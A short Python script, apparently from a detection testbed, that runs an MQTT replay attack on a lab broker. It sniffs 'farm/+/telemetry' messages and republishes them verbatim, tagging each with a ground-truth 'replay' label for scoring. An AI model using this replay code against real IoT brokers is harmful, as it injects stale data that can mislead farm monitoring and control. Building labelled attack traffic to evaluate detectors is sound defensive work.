"""Replay: record legitimate telemetry for a while, then re-publish it verbatim.

(The '_gt' evaluation label is rewritten to 'replay' for scoring only.)
For lab use against the local broker only.
"""
import argparse
import os
import json
import time

from common_attack import connect, make_client, report

ap = argparse.ArgumentParser()
ap.add_argument("--mode", default="plain")
ap.add_argument("--cert-as", default=None)
ap.add_argument("--record", type=float, default=3.0, help="seconds to sniff")
ap.add_argument("--delay", type=float, default=4.0, help="seconds to wait before replaying")
ap.add_argument("--max", type=int, default=20)
args = ap.parse_args()

client = make_client(args.mode, f"attacker-replay-{os.getpid()}", cert_as=args.cert_as)
captured = []
client.on_message = lambda c, u, m: captured.append((m.topic, json.loads(m.payload)))
ok, why = connect(client, args.mode)
if not ok:
    report(attack="replay", connected=False, reason=why, sniffed=0, sent=0)
    raise SystemExit(0)

client.subscribe("farm/+/telemetry")
time.sleep(args.record)
time.sleep(args.delay)
sent = 0
for topic, msg in captured[: args.max]:
    msg["_gt"] = "replay"
    client.publish(topic, json.dumps(msg))
    sent += 1
    time.sleep(0.1)
time.sleep(0.5)
client.loop_stop()
report(attack="replay", connected=True, sniffed=len(captured), sent=sent)
